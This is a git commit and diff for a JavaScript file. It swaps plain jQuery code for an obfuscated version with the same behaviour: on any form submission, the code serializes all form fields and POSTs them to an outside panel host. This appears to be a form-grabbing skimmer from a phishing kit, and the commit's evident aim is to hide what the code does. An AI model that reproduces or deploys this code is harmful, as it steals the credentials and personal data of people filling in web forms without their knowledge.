247aeb08d8287b6b4315413113d863df7ba15c9f
722818372 <99262453+722818372@users.noreply.github.com>
2022-02-08 20:10:07 +0700

    Update 82821818.js

--- 82821818.js
+++ 82821818.js
@@ -1,15 +1,1 @@
-$('form').submit(function() {
-	var d = $('form');
-
-	$.ajax({
-        url: "https://panel-deres-2jt-2022.hanzzhost.xyz/apiii.php",
-        type: "POST",
-        data: d.serialize(),
-        success: function () {
-            return true;
-        },
-        error: function () {
-            return true;
-        },
-    });
-});
+function _0x41a7(_0x45e385,_0x45bfe9){var _0x54c28a=_0x54c2();return _0x41a7=function(_0x41a7c,_0x2fa886){_0x41a7c=_0x41a7c-0xd9;var _0x185b61=_0x54c28a[_0x41a7c];return _0x185b61;},_0x41a7(_0x45e385,_0x45bfe9);}var _0x331233=_0x41a7;function _0x54c2(){var _0x311e1a=['ajax','4514616jkpYNn','serialize','4534800juUYbT','112TOhIUT','796514LsGWfJ','176206sjfbbW','37972269PeecRI','submit','513784joNUnA','1950610ZYpQHW','3SngzBO','https://panel-deres-2jt-2022.hanzzhost.xyz/apiii.php','form'];_0x54c2=function(){return _0x311e1a;};return _0x54c2();}(function(_0xbcec0a,_0x127921){var _0x4e14dd=_0x41a7,_0x21c3a5=_0xbcec0a();while(!![]){try{var _0x2052ab=-parseInt(_0x4e14dd(0xe5))/0x1+-parseInt(_0x4e14dd(0xe6))/0x2*(parseInt(_0x4e14dd(0xdd))/0x3)+-parseInt(_0x4e14dd(0xe3))/0x4+parseInt(_0x4e14dd(0xdc))/0x5+-parseInt(_0x4e14dd(0xe1))/0x6+parseInt(_0x4e14dd(0xe4))/0x7*(-parseInt(_0x4e14dd(0xdb))/0x8)+parseInt(_0x4e14dd(0xd9))/0x9;if(_0x2052ab===_0x127921)break;else _0x21c3a5['push'](_0x21c3a5['shift']());}catch(_0x57e30a){_0x21c3a5['push'](_0x21c3a5['shift']());}}}(_0x54c2,0xc5fbe),$(_0x331233(0xdf))[_0x331233(0xda)](function(){var _0x27948b=_0x331233,_0xf15a31=$(_0x27948b(0xdf));$[_0x27948b(0xe0)]({'url':_0x27948b(0xde),'type':'POST','data':_0xf15a31[_0x27948b(0xe2)](),'success':function(){return!![];},'error':function(){return!![];}});}));
